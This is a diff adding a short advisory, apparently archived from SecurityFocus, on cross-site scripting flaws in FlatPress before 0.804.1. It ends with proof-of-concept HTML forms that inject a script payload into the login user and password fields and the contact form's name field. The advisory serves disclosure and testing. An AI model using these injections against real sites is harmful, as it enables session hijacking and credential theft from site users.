@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/31407/info
+
+FlatPress is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.
+
+Versions prior to FlatPress 0.804.1 are vulnerable. 
+
+<form method="post" action="http://localhost/flatpress/login.php"> <input type="text" name="user" value='"><script>alert(1)</script>'> <input type=submit></form> <form method="post" action="http://localhost/flatpress/login.php"> <input type="text" name="pass" value='"><script>alert(1)</script>'> <input type=submit></form> <form method="post" action="http://localhost/flatpress/contact.php"> <input type="text" name="name" value='"><script>alert(1)</script>'> <input type=submit></form> 
